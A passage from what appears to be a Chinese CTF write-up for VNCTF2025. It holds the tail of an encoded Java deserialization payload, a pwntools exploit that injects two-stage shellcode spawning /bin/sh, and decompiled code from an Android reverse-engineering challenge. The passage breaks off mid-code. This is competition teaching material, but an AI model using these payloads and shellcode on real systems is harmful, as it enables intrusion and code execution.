class="number">29</span>tLmFsaWJhYmEuZmFzdGpzb<span class="number">24</span>uSlNPTkFycmF<span class="number">5</span>AAAAAAAAAAECAAFMAARsaXN<span class="number">0</span>cQB+AAx<span class="number">4</span>cHNxAH<span class="number">4</span>AFAAAAAF<span class="number">3</span>BAAAAAFxAH<span class="number">4</span>ABXh<span class="number">4</span>dXEAfgAGAAAALjAsAhQLFjHVSIZm<span class="number">3</span>Jlgu++vUZ<span class="number">4</span>F<span class="number">6</span>nvPXgIULEylPJxnRx<span class="number">9</span>bWzZaBXbbkQC/mJB<span class="number">0</span>AANEU<span class="number">0</span>FzcgAjamF<span class="number">2</span>YXguc<span class="number">3</span>dpbmcuZXZlbnQuRXZlbnRMaXN<span class="number">0</span>ZW<span class="number">5</span>lckxpc<span class="number">3</span>SxNsZ<span class="number">9</span>hOrWRAMAAHhwdAAXamF<span class="number">2</span>YS<span class="number">5</span>sYW<span class="number">5</span>nLkludGVybmFsRXJyb<span class="number">3</span>JzcgAcamF<span class="number">2</span>YXguc<span class="number">3</span>dpbmcudW<span class="number">5</span>kby<span class="number">5</span>VbmRvTWFuYWdlcuMrIXlMccpCAgACSQAOaW<span class="number">5</span>kZXhPZk<span class="number">5</span>leHRBZGRJAAVsaW<span class="number">1</span>pdHhyAB<span class="number">1</span>qYXZheC<span class="number">5</span>zd<span class="number">2</span>luZy<span class="number">51</span>bmRvLkNvbXBvdW<span class="number">5</span>kRWRpdKWeULpT<span class="number">25</span>X<span class="number">9</span>AgACWgAKaW<span class="number">5</span>Qcm<span class="number">9</span>ncmVzc<span class="number">0</span>wABWVkaXRzdAASTGphdmEvdXRpbC<span class="number">9</span>WZWN<span class="number">0</span>b<span class="number">3</span>I<span class="number">7</span>eHIAJWphdmF<span class="number">4</span>LnN<span class="number">3</span>aW<span class="number">5</span>nLnVuZG<span class="number">8</span>uQWJzdHJhY<span class="number">3</span>RVbmRvYWJsZUVkaXQIDRuO<span class="number">7</span>QILEAIAAloABWFsaXZlWgALaGFzQmVlbkRvbmV<span class="number">4</span>cAEBAXNyABBqYXZhLnV<span class="number">0</span>aWwuVmVjdG<span class="number">9</span>y<span class="number">2</span>Zd<span class="number">9</span>W<span class="number">4</span>A<span class="number">7</span>rwEDAANJABFjYXBhY<span class="number">2</span>l<span class="number">0</span>eUluY<span class="number">3</span>JlbWVudEkADGVsZW<span class="number">1</span>lbnRDb<span class="number">3</span>VudFsAC<span class="number">2</span>VsZW<span class="number">1</span>lbnREYXRhdAATW<span class="number">0</span>xqYXZhL<span class="number">2</span>xhbmcvT<span class="number">2</span>JqZWN<span class="number">0</span>O<span class="number">3</span>hwAAAAAAAAAAF<span class="number">1</span>cgATW<span class="number">0</span>xqYXZhLmxhbmcuT<span class="number">2</span>JqZWN<span class="number">0</span>O<span class="number">5</span>DOWJ<span class="number">8</span>QcylsAgAAeHAAAABkc<span class="number">3</span>IAHmNvbS<span class="number">5</span>hbGliYWJhLmZhc<span class="number">3</span>Rqc<span class="number">29</span>uLkpTT<span class="number">05</span>BcnJheQAAAAAAAAABAgABTAAEbGlzdHQAEExqYXZhL<span class="number">3</span>V<span class="number">0</span>aWwvTGlzdDt<span class="number">4</span>cHNxAH<span class="number">4</span>AAAAAAAF<span class="number">3</span>BAAAAAFxAH<span class="number">4</span>ABXhwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHB<span class="number">4</span>AAAAAAAAAGRweHg=)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250209-000009.jpg" alt="1"></p>
<p>我是真没想到居然那么多人都会做这个题，秀</p>
<h2 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a><strong>签个到吧</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">baozongwi@ubuntu:~/Desktop$ checksec pwn</span><br><span class="line">[!] Could not populate PLT: module &#x27;importlib.resources&#x27; has no attribute &#x27;files&#x27;</span><br><span class="line">[*] &#x27;/home/baozongwi/Desktop/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250209-130637.jpg" alt="1"></p>
<p><code>mmap</code>在<code>0x114514000</code>分配了<code>0x1000</code>字节的内存,权限为7，<code>mprotect</code>再次确认该内存的权限为7，所以这个区域可执行代码，把<code>shell</code>搞到这里来即可，先填充22个字节，执行<code>read</code>扩大空间，将栈指针<code>rsp</code> 指向<code>buf</code>末尾<code>+0x1000</code>，确保后续 push 操作不会覆盖Shellcode。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;Linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, buf, 0x80)</span></span><br><span class="line">shellcode1 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rsi, rdi</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov dl, 0x80</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">shellcode2 = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rsp, rsi</span></span><br><span class="line"><span class="string">    add rsp, 0x1000</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">9</span> + shellcode2</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a><strong>Hook Fish</strong></h2><p>下载之后是apk文件，直接放到<code>jadx</code>里面，找到关键代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hihitt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.DownloadManager.Request;</span><br><span class="line"><span class="keyword">import</span> android.app.DownloadManager;</span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.IntentFilter;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> BroadcastReceiver downloadCompleteReceiver;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> downloadID;</span><br><span class="line">    <span class="keyword">private</span> DownloadManager downloadManager;</span><br><span class="line">    <span class="keyword">private</span> File downloadedFile;</span><br><span class="line">    String encodeText;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActivity</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.downloadCompleteReceiver = <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">downloadedID</span> <span class="operator">=</span> intent.getLongExtra(<span class="string">&quot;extra_download_id&quot;</span>, -<span class="number">1L</span>);</span><br><span class="line">                <span class="keyword">if</span>(MainActivity.<span class="built_in">this</span>.downloadID == downloadedID) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.loadClass(MainActivity.<span class="built_in">this</span>.encodeText);</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.fish_fade();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">(<span class="type">char</span>[] arg3, <span class="type">int</span> arg4)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg4 &gt;= arg3.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        arg3[arg4] = (<span class="type">char</span>)(arg3[arg4] ^ arg3[arg4 + <span class="number">1</span>]);</span><br><span class="line">        arg3[arg4 + <span class="number">1</span>] = (<span class="type">char</span>)(arg3[arg4] ^ arg3[arg4 + <span class="number">1</span>]);</span><br><span class="line">        arg3[arg4] = (<span class="type">char</span>)(arg3[arg4] ^ arg3[arg4 + <span class="number">1</span>]);</span><br><span class="line">        MainActivity.code(arg3, arg4 + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String boy)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">loadedClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), <span class="string">&quot;hook_fish.dex&quot;</span>).getAbsolutePath(), <span class="built_in">this</span>.getCacheDir().getAbsolutePath(), <span class="literal">null</span>, <span class="built_in">this</span>.getClassLoader()).loadClass(<span class="string">&quot;fish.hook_fish&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> loadedClass.newInstance();</span><br><span class="line">            <span class="keyword">return</span> (String)loadedClass.getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(obj, boy);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String girl)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">loadedClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), <span class="string">&quot;hook_fish.dex&quot;</span>).getAbsolutePath(), <span class="built_in">this</span>.getCacheDir().getAbsolutePath(), <span class="literal">null</span>, <span class="built_in">this</span>.getClassLoader()).loadClass(<span class="string">&quot;fish.hook_fish&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> loadedClass.newInstance();</span><br><span class="line">            <span class="keyword">return</span> (String)loadedClass.getMethod(<span class="string">&quot;encode&quot;</span>, String.class).invoke(obj, girl);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String arg8)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] str1 = arg8.getBytes();</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; str1.length; ++i) &#123;</span><br><span class="line">            str1[i] = (<span class="type">byte</span>)(str1[i] + <span class="number">68</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexStringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> v4;</span><br><span class="line">        <span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; str1.length; ++v4) &#123;</span><br><span class="line">            hexStringBuilder.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="type">byte</span>)str1[v4])));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>[] str3 = hexStringBuilder.toString().toCharArray();</span><br><span class="line">        MainActivity.code(str3, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; str3.length; ++i) &#123;</span><br><span class="line">            str3[i] = str3[i] &gt;= <span class="number">97</span> &amp;&amp; str3[i] &lt;= <span class="number">102</span> ? ((<span class="type">char</span>)(str3[i] - <span class="number">49</span> + i % <span class="number">4</span>)) : ((<span class="type">char</span>)(str3[i] + <span class="number">55</span> + i % <span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Log.d(<span class="string">&quot;encrypt: &quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(str3));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fish</span><span class="params">(String arg8)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), <span class="string">&quot;hook_fish.dex&quot;</span>);</span><br><span class="line">        <span class="type">DownloadManager</span> <span class="variable">downloadManager</span> <span class="operator">=</span> (DownloadManager)<span class="built_in">this</span>.getSystemService(<span class="string">&quot;download&quot;</span>);</span><br><span class="line">        DownloadManager.<span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DownloadManager</span>.Request(Uri.parse(arg8));</span><br><span class="line">        request.setTitle(<span class="string">&quot;钓鱼&quot;</span>);</span><br><span class="line">        request.setDestinationUri(Uri.fromFile(file));</span><br><span class="line">        request.setAllowedOverRoaming(<span class="literal">false</span>);</span><br><span class="line">        request.setAllowedOverMetered(<span class="literal">false</span>);</span><br><span class="line">        <span class="built_in">this</span>.downloadID = downloadManager.enqueue(request);</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Fishing......&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fish_fade</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), <span class="string">&quot;hook_fish.dex&quot;</span>).delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadClass</span><span class="params">(String input0)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">input1</span> <span class="operator">=</span> <span class="built_in">this</span>.encode(input0);</span><br><span class="line">        <span class="type">DexClassLoader</span> <span class="variable">dLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(Uri.fromFile(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), <span class="string">&quot;hook_fish.dex&quot;</span>)).toString(), <span class="literal">null</span>, <span class="literal">null</span>, ClassLoader.getSystemClassLoader().getParent());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">loadedClass</span> <span class="operator">=</span> dLoader.loadClass(<span class="string">&quot;fish.hook_fish&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> loadedClass.newInstance();</span><br><span class="line">            <span class="keyword">if</span>(((Boolean)loadedClass.getMethod(<span class="string">&quot;check&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;input1&#125;)).booleanValue()) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;恭喜，鱼上钩了！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.fragment.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(layout.activity_main);</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(id.editTextText);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hookfish</span> <span class="operator">=</span> <span class="built_in">this</span>.getString(string.pool);</span><br><span class="line">        <span class="built_in">this</span>.downloadManager = (DownloadManager)<span class="built_in">this</span>.getSystemService(<span class="string">&quot;download&quot;</span>);</span><br><span class="line">        ((Button)<span class="built_in">this</span>.findViewById(id.download_button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">inputText</span> <span class="operator">=</span> editText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(!inputText.isEmpty()) &#123;</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.encodeText = MainActivity.encrypt(inputText);</span><br><span class="line">                    MainActivity.<span class="built_in">this</span>.fish(hookfish);</span><br><span class="line">                    <span class="type">List</span> <span class="variable">fishTypes</span> <span class="operator">=</span> Arrays.asList(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;鲈鱼&quot;</span>, <span class="string">&quot;鳕鱼&quot;</span>, <span class="string">&quot;甲鱼&quot;</span>, <span class="string">&quot;咸鱼&quot;</span>, <span class="string">&quot;金鱼&quot;</span>, <span class="string">&quot;鲮鱼&quot;</span>, <span class="string">&quot;鲅鱼&quot;</span>, <span class="string">&quot;鲫鱼&quot;</span>, <span class="string">&quot;山椒鱼&quot;</span>, <span class="string">&quot;鮰鱼&quot;</span>&#125;);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="string">&quot;收获一条&quot;</span> + ((String)fishTypes.get(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(fishTypes.size()))) + <span class="string">&quot;,但是鱼逃走了&quot;</span>;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, v6, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;请先输入口令，并在联网条件下再钓鱼&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">this</span>.registerReceiver(<span class="built_in">this</span>.downloadCompleteReceiver, <span class="keyword">new</span> <span class="title class_">IntentFilter</span>(<span class="string">&quot;android.intent.action.DOWNLOAD_COMPLETE&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.appcompat.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        <span class="built_in">this</span>.unregisterReceiver(<span class="built_in">this</span>.downloadCompleteReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要看加密算法，其他的纯扯淡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] str1 = str.getBytes();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str1.length; i++) &#123;</span><br><span class="line">        str1[i] = (<span class="type">byte</span>) (str1[i] + <span class="number">68</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">hexStringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">byte</span> b : str1) &#123;</span><br><span class="line">        hexStringBuilder.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(b)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> hexStringBuilder.toString();</span><br><span class="line">    <span class="type">char</span>[] str3 = str2.toCharArray();</span><br><span class="line">    code(str3, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span 